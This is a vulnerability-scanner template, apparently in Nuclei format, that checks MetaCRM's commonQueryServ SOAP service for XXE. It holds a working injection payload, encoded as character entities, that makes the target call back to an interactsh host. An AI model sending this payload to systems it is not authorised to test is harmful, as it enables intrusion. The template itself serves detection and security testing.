folder-7/poc-yaml-meta-crm-commonqueryserv-xxe.yaml

id: poc-yaml-meta-crm-commonqueryserv-xxe
info:
  name: MetaCRM客户关系管理系统 commonQueryServ XXE漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: DNSLOG,xxe
http:
  - raw:
      - |
        POST /services/ws HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:data="http://data.service.ws.metasoft.com/">
           <soapenv:Header/>
           <soapenv:Body>
              <data:commonQueryServ>
                 <!--type: string-->
                 <accessSessionValue>&#x3c;&#x3f;&#x78;&#x6d;&#x6c;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x30;&#x22;&#x20;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x3f;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x72;&#x6f;&#x6f;&#x74;&#x20;&#x5b;&#x0a;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;https://{{interactsh-url}}/xxe_test&#x22;&#x3e;&#x0a;&#x25;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x3b;&#x5d;&#x3e;&#x0a;&#x3c;&#x72;&#x6f;&#x6f;&#x74;&#x2f;&#x3e;</accessSessionValue>
                 <!--type: string-->
                 <objectname>sonoras</objectname>
                 <!--type: string-->
                 <corditionxml>quae</corditionxml>
              </data:commonQueryServ>
           </soapenv:Body>
        </soapenv:Envelope>
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "XML document must not be null"
      - type: word
        part: header
        words:
          - "text/xml"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
